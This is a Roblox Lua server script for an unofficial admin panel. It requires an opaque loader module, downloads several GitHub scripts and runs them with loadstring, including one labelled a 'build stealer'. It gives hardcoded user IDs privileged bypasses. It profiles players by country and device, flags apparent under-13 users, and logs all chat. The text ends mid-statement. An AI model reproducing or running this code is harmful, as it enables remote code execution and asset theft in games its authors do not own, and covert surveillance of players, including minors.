--made by cxo edited by vecko = Vecxo 
if _G.cxosadminloaded == true then
	warn("cxo's admin is already running!")
	return
end
_G.cxosadminloaded = true

local restrictedmode = true -- removes all bad commands like "/bang, /j, /woman" (so the game dont get terminated)

if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
	require(112354705578311).load() -- goog loader
end

function restrictcheck(v)
	if v and v.UserId then
		if v.UserId == 3222470105 or v.UserId == 1889958 or v.UserId == 244903894 then
			return false -- restrict check doesnt happen if its me cuz im cool like that
		end
		if restrictedmode then
			return true -- happens for these NOOBS though xD
		end
	else
		if restrictedmode then
			return true
		end
	end
end


-- dont touch any of these tables or ur gay --

-------------------------------------------- VARIABLES --------------------------------------------

-- local cxoURL = "https://raw.githubusercontent.com/pcxo/whitelisted/main/users" (old)
local cxoURL = "https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/whitelisted" -- (new)
local cmds = {}
local banned = {}
local countrybanned = {}
local crashbanned = {}
local countries = {["BD"] = "Bangladesh", ["BE"] = "Belgium", ["BF"] = "Burkina Faso", ["BG"] = "Bulgaria", ["BA"] = "Bosnia and Herzegovina", ["BB"] = "Barbados", ["WF"] = "Wallis and Futuna", ["BL"] = "Saint Barthelemy", ["BM"] = "Bermuda", ["BN"] = "Brunei", ["BO"] = "Bolivia", ["BH"] = "Bahrain", ["BI"] = "Burundi", ["BJ"] = "Benin", ["BT"] = "Bhutan", ["JM"] = "Jamaica", ["BV"] = "Bouvet Island", ["BW"] = "Botswana", ["WS"] = "Samoa", ["BQ"] = "Bonaire, Saint Eustatius and Saba ", ["BR"] = "Brazil", ["BS"] = "Bahamas", ["JE"] = "Jersey", ["BY"] = "Belarus", ["BZ"] = "Belize", ["RU"] = "Russia", ["RW"] = "Rwanda", ["RS"] = "Serbia", ["TL"] = "East Timor", ["RE"] = "Reunion", ["TM"] = "Turkmenistan", ["TJ"] = "Tajikistan", ["RO"] = "Romania", ["TK"] = "Tokelau", ["GW"] = "Guinea-Bissau", ["GU"] = "Guam", ["GT"] = "Guatemala", ["GS"] = "South Georgia and the South Sandwich Islands", ["GR"] = "Greece", ["GQ"] = "Equatorial Guinea", ["GP"] = "Guadeloupe", ["JP"] = "Japan", ["GY"] = "Guyana", ["GG"] = "Guernsey", ["GF"] = "French Guiana", ["GE"] = "Georgia", ["GD"] = "Grenada", ["GB"] = "United Kingdom", ["GA"] = "Gabon", ["SV"] = "El Salvador", ["GN"] = "Guinea", ["GM"] = "Gambia", ["GL"] = "Greenland", ["GI"] = "Gibraltar", ["GH"] = "Ghana", ["OM"] = "Oman", ["TN"] = "Tunisia", ["JO"] = "Jordan", ["HR"] = "Croatia", ["HT"] = "Haiti", ["HU"] = "Hungary", ["HK"] = "Hong Kong", ["HN"] = "Honduras", ["HM"] = "Heard Island and McDonald Islands", ["VE"] = "Venezuela", ["PR"] = "Puerto Rico", ["PS"] = "Palestinian Territory", ["PW"] = "Palau", ["PT"] = "Portugal", ["SJ"] = "Svalbard and Jan Mayen", ["PY"] = "Paraguay", ["IQ"] = "Iraq", ["PA"] = "Panama", ["PF"] = "French Polynesia", ["PG"] = "Papua New Guinea", ["PE"] = "Peru", ["PK"] = "Pakistan", ["PH"] = "Philippines", ["PN"] = "Pitcairn", ["PL"] = "Poland", ["PM"] = "Saint Pierre and Miquelon", ["ZM"] = "Zambia", ["EH"] = "Western Sahara", ["EE"] = "Estonia", ["EG"] = "Egypt", ["ZA"] = "South Africa", ["EC"] = "Ecuador", ["IT"] = "Italy", ["VN"] = "Vietnam", ["SB"] = "Solomon Islands", ["ET"] = "Ethiopia", ["SO"] = "Somalia", ["ZW"] = "Zimbabwe", ["SA"] = "Saudi Arabia", ["ES"] = "Spain", ["ER"] = "Eritrea", ["ME"] = "Montenegro", ["MD"] = "Moldova", ["MG"] = "Madagascar", ["MF"] = "Saint Martin", ["MA"] = "Morocco", ["MC"] = "Monaco", ["UZ"] = "Uzbekistan", ["MM"] = "Myanmar", ["ML"] = "Mali", ["MO"] = "Macao", ["MN"] = "Mongolia", ["MH"] = "Marshall Islands", ["MK"] = "Macedonia", ["MU"] = "Mauritius", ["MT"] = "Malta", ["MW"] = "Malawi", ["MV"] = "Maldives", ["MQ"] = "Martinique", ["MP"] = "Northern Mariana Islands", ["MS"] = "Montserrat", ["MR"] = "Mauritania", ["IM"] = "Isle of Man", ["UG"] = "Uganda", ["TZ"] = "Tanzania", ["MY"] = "Malaysia", ["MX"] = "Mexico", ["IL"] = "Israel", ["FR"] = "France", ["IO"] = "British Indian Ocean Territory", ["SH"] = "Saint Helena", ["FI"] = "Finland", ["FJ"] = "Fiji", ["FK"] = "Falkland Islands", ["FM"] = "Micronesia", ["FO"] = "Faroe Islands", ["NI"] = "Nicaragua", ["NL"] = "Netherlands", ["NO"] = "Norway", ["NA"] = "Namibia", ["VU"] = "Vanuatu", ["NC"] = "New Caledonia", ["NE"] = "Niger", ["NF"] = "Norfolk Island", ["NG"] = "Nigeria", ["NZ"] = "New Zealand", ["NP"] = "Nepal", ["NR"] = "Nauru", ["NU"] = "Niue", ["CK"] = "Cook Islands", ["XK"] = "Kosovo", ["CI"] = "Ivory Coast", ["CH"] = "Switzerland", ["CO"] = "Colombia", ["CN"] = "China", ["CM"] = "Cameroon", ["CL"] = "Chile", ["CC"] = "Cocos Islands", ["CA"] = "Canada", ["CG"] = "Republic of the Congo", ["CF"] = "Central African Republic", ["CD"] = "Democratic Republic of the Congo", ["CZ"] = "Czech Republic", ["CY"] = "Cyprus", ["CX"] = "Christmas Island", ["CR"] = "Costa Rica", ["CW"] = "Curacao", ["CV"] = "Cape Verde", ["CU"] = "Cuba", ["SZ"] = "Swaziland", ["SY"] = "Syria", ["SX"] = "Sint Maarten", ["KG"] = "Kyrgyzstan", ["KE"] = "Kenya", ["SS"] = "South Sudan", ["SR"] = "Suriname", ["KI"] = "Kiribati", ["KH"] = "Cambodia", ["KN"] = "Saint Kitts and Nevis", ["KM"] = "Comoros", ["ST"] = "Sao Tome and Principe", ["SK"] = "Slovakia", ["KR"] = "South Korea", ["SI"] = "Slovenia", ["KP"] = "North Korea", ["KW"] = "Kuwait", ["SN"] = "Senegal", ["SM"] = "San Marino", ["SL"] = "Sierra Leone", ["SC"] = "Seychelles", ["KZ"] = "Kazakhstan", ["KY"] = "Cayman Islands", ["SG"] = "Singapore", ["SE"] = "Sweden", ["SD"] = "Sudan", ["DO"] = "Dominican Republic", ["DM"] = "Dominica", ["DJ"] = "Djibouti", ["DK"] = "Denmark", ["VG"] = "British Virgin Islands", ["DE"] = "Germany", ["YE"] = "Yemen", ["DZ"] = "Algeria", ["US"] = "United States", ["UY"] = "Uruguay", ["YT"] = "Mayotte", ["UM"] = "United States Minor Outlying Islands", ["LB"] = "Lebanon", ["LC"] = "Saint Lucia", ["LA"] = "Laos", ["TV"] = "Tuvalu", ["TW"] = "Taiwan", ["TT"] = "Trinidad and Tobago", ["TR"] = "Turkey", ["LK"] = "Sri Lanka", ["LI"] = "Liechtenstein", ["LV"] = "Latvia", ["TO"] = "Tonga", ["LT"] = "Lithuania", ["LU"] = "Luxembourg", ["LR"] = "Liberia", ["LS"] = "Lesotho", ["TH"] = "Thailand", ["TF"] = "French Southern Territories", ["TG"] = "Togo", ["TD"] = "Chad", ["TC"] = "Turks and Caicos Islands", ["LY"] = "Libya", ["VA"] = "Vatican", ["VC"] = "Saint Vincent and the Grenadines", ["AE"] = "United Arab Emirates", ["AD"] = "Andorra", ["AG"] = "Antigua and Barbuda", ["AF"] = "Afghanistan", ["AI"] = "Anguilla", ["VI"] = "U.S. Virgin Islands", ["IS"] = "Iceland", ["IR"] = "Iran", ["AM"] = "Armenia", ["AL"] = "Albania", ["AO"] = "Angola", ["AQ"] = "Antarctica", ["AS"] = "American Samoa", ["AR"] = "Argentina", ["AU"] = "Australia", ["AT"] = "Austria", ["AW"] = "Aruba", ["IN"] = "India", ["AX"] = "Aland Islands", ["AZ"] = "Azerbaijan", ["IE"] = "Ireland", ["ID"] = "Indonesia", ["UA"] = "Ukraine", ["QA"] = "Qatar", ["MZ"] = "Mozambique"}
local chats = {}
local messages = {}
local TempWhitelist = {}
local AutoRespawn = {}
local AutoUnpunish = {}
local fpslooped = {}
local googul = {}
local frames = {}
local gmodded = {}
local lelnobypassforu = {}
local anticheatmeasure = {}
local panelanticheat = {}
local synapsex = {}
local autodelete = {}
local configs = {}
local plrcfgs = {}
local plrparts = {}
local hidden = {}
local afk = {}
local iyed = {}
local cmdbared = {}
local chatter = {}
local chathacker = {}
local cxoconnections = {}
local emojis = {"‚ùì", "‚å®Ô∏èüñ±Ô∏è", "üì±", "üéÆ", "ü•Ω", "üñ±Ô∏è", "‚å®Ô∏è"}
local locked = false
local guiactive = false
local iyloaded = nil
local agelocked = false
local agelocknum = 10
local connected, connected2, banhammered, ignorethis, ignorethistoo, V1, music, nodisco, muter, nexusloaded

-----------------------------------------------------------------------------------------------

_G.prefix = "/"
local tag = false

-------------------------------------------- SETUP --------------------------------------------

local success, result = pcall(function() -- setup
	return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/setup")
end)

if success then
	local content = result
	local loaded, fail = loadstring(content)

	if loaded then
		loaded()
	else
		warn("Failed to load setup script: " .. fail)
	end
else
	warn("Failed to load setup script")
end

local success, result = pcall(function() -- gmod gun
	return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/gunscript")
end)

if success then
	local content = result
	local loaded, fail = loadstring(content)

	if loaded then
		loaded()
	else
		warn("Failed to load gmod gun: " .. fail)
	end
else
	warn("Failed to load gmod gun.")
end

local success, result = pcall(function() -- decryptionite's build loader
	return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/decryptionite/streaming/refs/heads/main/Kohls%20Admin%20House%20NP/unlocked_buildload_v1.lua")
end)

if success then
	local content = result
	local loaded, fail = loadstring(content)
	if loaded then
		loaded()
	else
		warn("Failed to load decryptionite's build stealer / loader: ".. fail)
	end
else
	warn("Failed to load decryptionite's build stealer / loader")
end

local success, result = pcall(function() -- configs loader
	return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/VexcoConfigs")
end)

if success then
	for UID, cfg in result:gmatch("(%d+):%[%[(.-)%]%]") do
		local data = {}

		for c in cfg:gmatch('"([^"]+)"') do
			table.insert(data, c)
		end

		configs[UID] = data
	end
else
	warn("Failed to load configs")
end

repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")

local BackupIDs = {
	-- cxo
	3222470105;
	7306448629;
	21517314;
	35950257;
	-- tech
	1702851506;
	-- knocks
	1551416114;
	-- kozy
	1889958;
	-- decryptionite
	120983992;
	1921860822;
	366631664;
	13425405;
	-- palamode
	523322320;
	-- freddie
	1724769699;
	--vecko
	244903894;
}

function GetWhitelist()
	local returnedUsers = {}

	-- Check from GitHub (first priority)
	local success, response = pcall(function()
		return game:GetService("HttpService"):GetAsync(cxoURL)
	end)

	if success and response then
		returnedUsers = string.split(response, "\n")
	else
		print("GitHub check failed! Using backup table.")
		returnedUsers = BackupIDs
	end

	return returnedUsers
end

_G.Whitelist = GetWhitelist()

function p(a, me)
	local ps = game.Players:GetPlayers()
	local found = {}

	if a:lower() == "me" then
		found = {me}
	elseif a:lower() == "others" then
		for i, player in ipairs(ps) do
			if player ~= me then
				table.insert(found, player)
			end
		end
	elseif a:lower() == "all" then
		found = ps
	elseif a:lower() == "random" then
		if #ps > 0 then
			found = {ps[math.random(1, #ps)]}
		end
	else
		for i, player in ipairs(ps) do
			if player.Name:lower():sub(1, #a) == a:lower() or player.DisplayName:lower():sub(1, #a) == a:lower() then
				table.insert(found, player)
			end
		end
	end

	return found
end

local function addcmd(data)
	if cmds[data.Name] then
		return
	end

	if not data.Aliases then
		data.Aliases = {}
	end

	if data.Player == nil then
		data.Player = true
	end

	cmds[data.Name] = {
		Data = data
	}
end

function runcmd(cmdn,message,targets,arguments,extra)
	local command = cmdn
	for name, cmd in pairs(cmds) do
		if table.find(cmd.Data.Aliases, cmdn) then
			command = name
			break
		end
	end
	cmds[command].Data.Function(nil,targets,arguments,extra)
	-- too lazy to remove the message argument entirely
end

function gui(plr, section)

	--[[for i, v in pairs(game.Players:GetPlayers()) do
		local gather = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("cxo's Device LocalScript"):Clone()
		if gather then
			gather.Parent = v.Character
		end
	end]]

	if plr.PlayerGui and plr.PlayerGui:FindFirstChild("Vecxo's admin GUI") then
		return
	end

	if not table.find(panelanticheat, plr.UserId) then
		table.insert(panelanticheat, plr.UserId)
	end

	-- GUI TO LUA --

	local ScreenGui = Instance.new("ScreenGui")
	local Frame = Instance.new("Frame")
	local Frame_2 = Instance.new("Frame")
	local TextLabel = Instance.new("TextLabel")
	local CloseButton = Instance.new("TextButton")
	local MinimizeButton = Instance.new("TextButton")
	local LogsButton = Instance.new("TextButton")
	local ImageLabel = Instance.new("ImageLabel")

	local TabsFrame = Instance.new("Frame")
	local PlayerListButton = Instance.new("TextButton")
	local CommandsButton = Instance.new("TextButton")
	local SudoButton = Instance.new("TextButton")
	local TabHighlight = Instance.new("Frame")

	local ContentFrame = Instance.new("Frame")
	local PlayerList = Instance.new("ScrollingFrame")
	local CommandsList = Instance.new("Frame")
	local SudoPanel = Instance.new("Frame")
	local SudoLabel = Instance.new("TextLabel")

	ScreenGui.Parent = plr:WaitForChild("PlayerGui")
	ScreenGui.Name = "Vecxo's admin GUI"
	ScreenGui.ResetOnSpawn = false

	Frame.Parent = ScreenGui
	Frame.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
	Frame.BackgroundTransparency = 0.2
	Frame.Size = UDim2.new(0, 523, 0, 350)
	Frame.Position = UDim2.new(0.3, 0, 0.3, 0)
	Frame.Draggable = true
	Frame.Active = true

	Frame_2.Parent = Frame
	Frame_2.Size = UDim2.new(1, 0, 0, 24)
	Frame_2.BackgroundTransparency = 0.4
	Frame_2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	Frame_2.Name = "Frame2"

	TextLabel.Parent = Frame_2
	TextLabel.Size = UDim2.new(0, 177, 0, 24)
	TextLabel.Position = UDim2.new(0.33, 0, 0, 0)
	TextLabel.Font = Enum.Font.SourceSansBold
	TextLabel.Text = "Vecxo's admin"
	TextLabel.TextScaled = true
	TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.BackgroundTransparency = 1

	ImageLabel.Parent = Frame_2
	ImageLabel.Size = UDim2.new(0, 24, 0, 24)
	ImageLabel.BackgroundTransparency = 1
	ImageLabel.Image = "rbxthumb://type=AvatarHeadShot&id=" .. plr.UserId .. "&w=420&h=420"

	CloseButton.Parent = Frame_2
	CloseButton.Position = UDim2.new(0.95, 0, 0, 0)
	CloseButton.Size = UDim2.new(0, 23, 0, 24)
	CloseButton.BackgroundTransparency = 1
	CloseButton.Text = "X"
	CloseButton.TextScaled = true
	CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	CloseButton.Font = Enum.Font.SourceSansBold
	CloseButton.Name = "CloseButton"

	MinimizeButton.Parent = Frame_2
	MinimizeButton.Position = UDim2.new(0.91, 0, 0, 0)
	MinimizeButton.Size = UDim2.new(0, 23, 0, 24)
	MinimizeButton.BackgroundTransparency = 1
	MinimizeButton.Text = "‚Äì"
	MinimizeButton.TextScaled = true
	MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	MinimizeButton.Font = Enum.Font.SourceSansBold
	MinimizeButton.Name = "MinimizeButton"

	LogsButton.Parent = Frame_2
	LogsButton.Position = UDim2.new(0.060, 0, 0.2, 0)
	LogsButton.Size = UDim2.new(0, 25, 0, 15)
	LogsButton.BackgroundTransparency = 1
	LogsButton.Text = "LOGS"
	LogsButton.TextSize = 14
	LogsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	LogsButton.Font = Enum.Font.SourceSansBold
	LogsButton.Name = "LogsButton"

	TabsFrame.Parent = Frame
	TabsFrame.Size = UDim2.new(1, 0, 0, 30)
	TabsFrame.Position = UDim2.new(0, 0, 0, 24)
	TabsFrame.BackgroundTransparency = 1
	TabsFrame.Name = "TabsFrame"

	TabHighlight.Parent = TabsFrame
	TabHighlight.Size = UDim2.new(0.33, 0, 0, 3)
	TabHighlight.Position = UDim2.new(0, 0, 1, -3)
	TabHighlight.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TabHighlight.Name = "TabHighlight"

	PlayerListButton.Parent = TabsFrame
	PlayerListButton.Size = UDim2.new(0.33, 0, 1, 0)
	PlayerListButton.Position = UDim2.new(0, 0, 0, 0)
	PlayerListButton.BackgroundTransparency = 1
	PlayerListButton.Text = "Player List"
	PlayerListButton.TextSize = 20
	PlayerListButton.Font = Enum.Font.SourceSansBold
	PlayerListButton.TextColor3 = Color3.fromRGB(180, 180, 180)
	PlayerListButton.Name = "PlayerListButton"

	CommandsButton.Parent = TabsFrame
	CommandsButton.Size = UDim2.new(0.33, 0, 1, 0)
	CommandsButton.Position = UDim2.new(0.33, 0, 0, 0)
	CommandsButton.BackgroundTransparency = 1
	CommandsButton.Text = "Commands"
	CommandsButton.TextSize = 20
	CommandsButton.Font = Enum.Font.SourceSansBold
	CommandsButton.TextColor3 = Color3.fromRGB(180, 180, 180)
	CommandsButton.Name = "CommandsButton"

	SudoButton.Parent = TabsFrame
	SudoButton.Size = UDim2.new(0.33, 0, 1, 0)
	SudoButton.Position = UDim2.new(0.66, 0, 0, 0)
	SudoButton.BackgroundTransparency = 1
	SudoButton.Text = "Panel"
	SudoButton.TextSize = 20
	SudoButton.Font = Enum.Font.SourceSansBold
	SudoButton.TextColor3 = Color3.fromRGB(180, 180, 180)
	SudoButton.Name = "SudoButton"

	ContentFrame.Parent = Frame
	ContentFrame.Size = UDim2.new(1, 0, 1, -54)
	ContentFrame.Position = UDim2.new(0, 0, 0, 54)
	ContentFrame.BackgroundTransparency = 1
	ContentFrame.Name = "ContentFrame"

	local scroll = Instance.new("ScrollingFrame")
	scroll.Size = UDim2.new(1, 0, 1, -40)
	scroll.Position = UDim2.new(0, 0, 0, 0)
	scroll.BackgroundTransparency = 1
	scroll.BorderSizePixel = 0
	scroll.ScrollBarThickness = 5
	scroll.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
	scroll.Parent = PlayerList
	scroll.Name = "scroll"

	local layout = Instance.new("UIListLayout")
	layout.Parent = scroll
	layout.FillDirection = Enum.FillDirection.Vertical
	layout.Padding = UDim.new(0, 5)
	layout.Name = "layout"

	local function update()
		task.wait(0.15)
		local frames = {}
		local pings = {}

		for i, q in pairs(scroll:GetChildren()) do -- inserts their frame into the table so that it doesnt spam it
			if q:IsA("Frame") and not frames[q.Name] then
				frames[q.Name] = q
			end
		end

		layout.Padding = UDim.new(0, 5)

		for i, player in ipairs(game.Players:GetPlayers()) do

			if table.find(hidden, player.UserId) and plr.UserId ~= 3222470105 then
				continue
			end

			local plrframe = frames[player.Name] 
			if not plrframe then
				plrframe = Instance.new("Frame")
				plrframe.Size = UDim2.new(1, 0, 0, 35)
				plrframe.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
				plrframe.BackgroundTransparency = 0.5
				plrframe.BorderSizePixel = 0
				plrframe.Parent = scroll
				plrframe.Name = player.Name
			end

			task.spawn(function()
				if cxoconnections["Device"] then
					cxoconnections["Device"](player)
				end
			end)

			local starttime = tick()

			repeat task.wait() until googul[player.UserId] or not game.Players:FindFirstChild(player.Name) or (tick() - starttime) >= 10
			-- waits until the players device has been found (or exits if they havent been found in 3 seconds)

			local headshot = plrframe:FindFirstChild("headshot")
			if not headshot then
				headshot = Instance.new("ImageLabel")
				headshot.Size = UDim2.new(0, 30, 0, 30)
				headshot.Position = UDim2.new(0, 3.5, 0, 5)
				headshot.BackgroundTransparency = 1
				headshot.Name = "headshot"
				headshot.Parent = plrframe
			end
			headshot.Image = "rbxthumb://type=AvatarHeadShot&id=" .. player.UserId .. "&w=420&h=420"

			local plrname = plrframe:FindFirstChild("plrname")
			if not plrname then
				plrname = Instance.new("TextLabel")
				plrname.Size = UDim2.new(0.6, -5, 1, 0)
				plrname.Position = UDim2.new(0, 35, 0, 0)
				plrname.TextColor3 = Color3.fromRGB(255, 255, 255)
				plrname.BackgroundTransparency = 1
				plrname.Font = Enum.Font.Gotham
				plrname.TextSize = 14
				plrname.TextScaled = false
				plrname.TextXAlignment = Enum.TextXAlignment.Left
				plrname.TextYAlignment = Enum.TextYAlignment.Center
				plrname.Name = "plrname"
				plrname.Parent = plrframe
			end

			local hiddencheck = ""

			if table.find(hidden, player.UserId) ~= nil then
				hiddencheck = "üëª"
			end

			local perm = nil
			local persons = nil

			if _G.tempadmins and table.find(_G.tempadmins, player.Name) then
				perm = "PERM"
			elseif _G.permadmins and table.find(_G.permadmins, player.Name) then
				perm = "PERM"
			end

			if _G.p299 and table.find(_G.p299, player.Name) then
				persons = "P299"
			end

			if googul[player.UserId] then
				plrname.Text = "(".. player.DisplayName ..") ".. hiddencheck .."\n@" .. player.Name .. " ".. googul[player.UserId]
			else
				plrname.Text = "(".. player.DisplayName ..") ".. hiddencheck .."\n@" .. player.Name .. " ‚ùì"
			end

			task.spawn(function()
				local success, code = pcall(game:GetService("LocalizationService").GetCountryRegionForPlayerAsync, game:GetService("LocalizationService"), player)
				local country = plrframe:FindFirstChild("country")

				if not country then
					country = Instance.new("TextLabel")
					country.Size = UDim2.new(0.4, 0, 1, 0)
					country.Position = UDim2.new(0.6, 0, 0, 0)
					country.BackgroundTransparency = 1
					country.Font = Enum.Font.MontserratBold
					country.TextSize = 14
					country.TextXAlignment = Enum.TextXAlignment.Right
					country.TextYAlignment = Enum.TextYAlignment.Center
					country.Name = "country"
					country.Parent = plrframe
				end

				local flag = ""
				if code:upper() == "XK" then
					flag = "üè≥Ô∏è" -- kosovo aint got a flag (Korabi: Why do i not have a flag!?)
				end

				for i = 1, #code do
					flag = flag .. utf8.char(utf8.codepoint("üá¶") + string.byte(code:upper():sub(i, i)) - string.byte("A"))
				end

				country.Text = success and "[ ".. flag .." ".. countries[code]  .." ]  " or "[UNKNOWN]  "
				country.TextColor3 = success and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
			end)
			frames[player.Name] = nil

			if pings[player.Name] then
				task.cancel(pings[player.Name])
			end

			pings[player.Name] = task.spawn(function()
				while player and player.Parent == game.Players do

					local ping = math.floor(player:GetNetworkPing() * 1000)
					local hiddencheck = table.find(hidden, player.UserId) and "üëª" or ""
					local whitelistcheck = (table.find(_G.Whitelist, tostring(player.UserId)) or table.find(TempWhitelist, player.UserId)) and "üëë" or ""
					local goog = googul[player.UserId] or "‚ùì"
					local playerage = "Unknown"

					if plr.Name ~= player.Name then
						local success, chat = pcall(function()
							return game:GetService("TextChatService"):CanUsersDirectChatAsync(plr.UserId, { player.UserId })
						end)

						if success then
							if #chat > 0 then
								playerage = "13+"
							else
								playerage = "<13"
							end
						end
					else
						playerage = ""
					end

					local playerframe = scroll:FindFirstChild(player.Name)
					if playerframe and playerframe:FindFirstChild("plrname") then
						playerframe.plrname.Text = string.format("(%s) %s%s%s\n@%s %s %dms", player.DisplayName, playerage, hiddencheck, whitelistcheck, player.Name, goog, ping)
					end

					task.wait(5)
				end
			end)

		end

		for i, frame in pairs(frames) do -- stops frames from being blank
			if not game.Players:FindFirstChild(i) then
				frame:Destroy()
			end
		end

		local seenframes = {}

		for i,v in pairs(scroll:GetChildren()) do -- stops duplicate frames
			if not table.find(seenframes, v.Name) then
				table.insert(seenframes, v.Name)
			else
				v:Destroy()
			end
		end

		scroll.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y)
	end

	local LogsPanel = Instance.new("Frame")
	LogsPanel.Parent = Frame
	LogsPanel.Size = UDim2.new(0, 180, 0, 310)
	LogsPanel.Position = UDim2.new(1, 0, 0, 24)
	LogsPanel.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
	LogsPanel.BackgroundTransparency = 0.2
	LogsPanel.BorderSizePixel = 0
	LogsPanel.Visible = false
	LogsPanel.Name = "LogsPanel"

	local LogsScroll = Instance.new("ScrollingFrame")
	LogsScroll.Parent = LogsPanel
	LogsScroll.Size = UDim2.new(1, 0, 1, 0)
	LogsScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
	LogsScroll.ScrollBarThickness = 6
	LogsScroll.BackgroundTransparency = 1
	LogsScroll.BorderSizePixel = 0
	LogsScroll.Name = "LogsScroll"

	local LogsLayout = Instance.new("UIListLayout")
	LogsLayout.Parent = LogsScroll
	LogsLayout.SortOrder = Enum.SortOrder.LayoutOrder
	LogsLayout.Padding = UDim.new(0, 2)

	LogsLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
		LogsScroll.CanvasSize = UDim2.new(0, 0, 0, LogsLayout.AbsoluteContentSize.Y)
	end)

	local function log(player, msg)
		local LogFrame = Instance.new("Frame")
		LogFrame.Size = UDim2.new(1, -4, 0, 20)
		LogFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		LogFrame.BackgroundTransparency = 0.5
		LogFrame.BorderSizePixel = 0
		LogFrame.Parent = LogsScroll

		local LogsMsg = Instance.new("TextLabel")
		LogsMsg.Parent = LogFrame
		LogsMsg.Size = UDim2.new(1, -6, 1, 0)
		LogsMsg.Position = UDim2.new(0, 6, 0, 0)
		LogsMsg.BackgroundTransparency = 1
		LogsMsg.TextColor3 = Color3.fromRGB(255, 255, 255)
		LogsMsg.Font = Enum.Font.SourceSans
		LogsMsg.TextSize = 13
		LogsMsg.TextXAlignment = Enum.TextXAlignment.Left
		LogsMsg.Text = player .. ": " .. msg
		LogsMsg.TextWrapped = false
		LogsMsg.TextTruncate = Enum.TextTruncate.AtEnd

		local connection
		connection = LogsLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
			LogsScroll.CanvasSize = UDim2.new(0, 0, 0, LogsLayout.AbsoluteContentSize.Y)
			LogsScroll.CanvasPosition = Vector2.new(0, LogsLayout.AbsoluteContentSize.Y)
			connection:Disconnect()
		end)
	end

	for i,v in pairs(game.Players:GetPlayers()) do
		cxoconnections["Chatted3"] = v.Chatted:Connect(function(msg)
			log(v.DisplayName, msg)
		end)
	end

	for i, msg in ipairs(messages) do
		local player, message = string.match(msg, "^(.-):%s*(.*)")
		if player and message then
			log(player, message)
		end
	end

	game.Players.PlayerAdded:Connect(function(player)

		repeat task.wait() until player and player.Character or not game.Players:FindFirstChild(player.Name)

		if banned[player.UserId] or crashbanned[player.UserId] then
			return -- stops frames from appearing then vanishing instantly (waste of resources)
		end

		if autodelete[player.UserId] then
			return -- stops frames from appearing then vanishing instantly (waste of resources)
		end

		if locked == true and not table.find(_G.Whitelist, tostring(player.UserId)) and not table.find(TempWhitelist, player.UserId) then
			return -- stops frames from appearing then vanishing instantly (waste of resources)
		end

		if frames[player.Name] then
			frames[player.Name] = nil -- removes their frame if they already have one
		end

		cxoconnections["Chatted4"] = player.Chatted:Connect(function(msg)
			log(player.DisplayName, msg)
		end)

		task.wait(0.1)

		task.spawn(function()
			cxoconnections["Device"](player)
		end)

		local starttime = tick()

		repeat task.wait() until googul[player.UserId] or not game.Players:FindFirstChild(player.Name) or (tick() - starttime) >= 10
		-- waits until their device is found

		task.spawn(function()
			update()
		end)
	end)

	game.Players.PlayerRemoving:Connect(function(player)

		if googul[player.UserId] then
			googul[player.UserId] = nil -- removes their frame (incase they rejoin on a different device or something)
		end

		task.spawn(function()
			update()
		end)
	end)

	PlayerList.Parent = ContentFrame
	PlayerList.Size = UDim2.new(1, 0, 1, 0)
	PlayerList.CanvasSize = UDim2.new(0, 0, 0, 200)
	PlayerList.ScrollBarThickness = 8
	PlayerList.BackgroundTransparency = 1

	CommandsList.Parent = ContentFrame
	CommandsList.Size = UDim2.new(1, 0, 1, 0)
	CommandsList.Visible = false
	CommandsList.BackgroundTransparency = 1

	local ScrollFrame = Instance.new("ScrollingFrame")
	ScrollFrame.Parent = CommandsList
	ScrollFrame.Size = UDim2.new(1, 0, 1, 0)
	ScrollFrame.BackgroundTransparency = 1
	ScrollFrame.ScrollBarThickness = 6
	ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 200)
	ScrollFrame.Name = "ScrollFrame"

	local uiLayout = Instance.new("UIListLayout")
	uiLayout.Parent = ScrollFrame
	uiLayout.Padding = UDim.new(0, 5)
	uiLayout.Name = "Layout"

	local counter = 1

	for i, cmd in pairs(cmds) do
		local CommandFrame = Instance.new("Frame")
		CommandFrame.Parent = ScrollFrame
		CommandFrame.Size = UDim2.new(1, -10, 0, 35)
		CommandFrame.BackgroundTransparency = 1
		CommandFrame.BorderSizePixel = 0

		local CommandLabel = Instance.new("TextLabel")
		CommandLabel.Parent = CommandFrame
		CommandLabel.Size = UDim2.new(0.7, 0, 1, 0)
		CommandLabel.Position = UDim2.new(0, 5, 0, 0)
		CommandLabel.BackgroundTransparency = 1
		CommandLabel.Text = " " .. counter .. " | " .. i
		CommandLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		CommandLabel.TextSize = 16
		CommandLabel.Font = Enum.Font.Gotham
		CommandLabel.TextXAlignment = Enum.TextXAlignment.Left
		CommandLabel.Name = "CommandLabel"

		local AliasText = "Aliases: None "
		if cmd.Data and cmd.Data.Aliases and #cmd.Data.Aliases > 0 then
			AliasText = "Aliases: {" .. table.concat(cmd.Data.Aliases, ", ") .. "} "
		end

		local CommandAlias = Instance.new("TextLabel")
		CommandAlias.Parent = CommandFrame
		CommandAlias.Size = UDim2.new(0.3, -5, 1, 0)
